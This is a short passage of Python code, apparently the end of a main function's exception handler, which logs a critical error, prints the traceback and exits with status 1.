        logger.error(f"Critical error in main: {e}")
        traceback.print_exc()
        sys.exit(1)
